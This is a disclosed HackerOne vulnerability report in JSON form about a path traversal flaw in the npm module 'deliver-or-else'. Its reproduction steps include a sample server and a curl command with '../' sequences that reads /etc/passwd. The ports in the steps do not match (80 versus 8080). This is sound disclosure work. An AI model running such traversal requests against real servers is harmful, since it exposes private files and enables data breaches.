{
  "id": 507310,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDczMTA=",
  "url": "https://hackerone.com/reports/507310",
  "title": "[deliver-or-else] Path Traversal",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2019-03-10T04:49:02.886Z",
  "submitted_at": "2019-03-10T04:49:02.886Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "johnssimon007",
    "url": "/johnssimon007",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-01-29T16:26:38.200Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-12-30T16:26:36.700Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report path traversal in deliver-or-else module\nIt allows an attacker to read system files via path traversal through commandline\n\n# Module\n\n**module name:** deliver-or-else\n**version:** 1.0.0\n**npm page:** https://www.npmjs.com/package/deliver-or-else\n\n## Module Description\n\n> Copy description from npm page\n\n# Vulnerability\n\n## Vulnerability Description\n\nDirectory traversal through the url which doesn't verify the file is from the root directory path.\n\n## Steps To Reproduce:\n\n1.npm i deliver-or-else\n\n2.now create a node.js(test.js) file for starting up a localserver on port 80,which will serve the file on the directory(public) over the web browser depending on the file requested by user through url\n\nhere is code for test.js\n\nconst Deliver = require('deliver-or-else')\nconst path = require('path')\n \n// It is up to you to resolve the document root directory\nconst http = require('http')\nlet deliver = new Deliver(path.join(__dirname, 'public'))\nlet server = http.createServer((req, res) => {\n    /**\n     * The `deliver` method returns a `Promise`, which in turn can be used to \n     * catch any errors (such as a 404). We could also provide a `then` clause \n     * for when it works successfully and a file has been delivered.\n     */\n    deliver.deliver(req, res).catch((err) => {\n        // The err contains information regarding how the `fs.readFile` failed\n        \n        res.statusCode = 404\n        res.setHeader('Content-Type', 'text/plain')\n        res.end('404, no such file.')\n    })\n})\n \nserver.listen(80, '127.0.0.1', function () {\n    console.log('Starting server...')\n})\n\n3.run below command\nnode test.js\nthis will startup the server at port 80 \n\n4.trying to fetch a file outside of \"public\" dir is exempted and shows 404 error\n\n5.this can be bypassed by using curl via commandline by running below command\ncurl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/passwd\n\nwhich will return the passwd directory contents\n\n\n# Wrap up\n\n> Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n> Hunter's comments and funny memes goes here\n\n## Impact\n\nThis vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 438490,
      "file_name": "Screenshot_from_2019-03-10_10-19-01.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/490/97a245cd45453e3d871c96ad73ab819249cd35ef/Screenshot_from_2019-03-10_10-19-01.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-03-10_10-19-01.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-03-10_10-19-01.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131911Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ff4b0e5ee74ce49924953d04e3a1428efa172f35a7a8802d9fb9ed0dd6ef322a",
      "file_size": 99408,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-01-29T16:26:36.790Z",
  "allow_singular_disclosure_after": -127515154.5388823,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "deb0con"
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
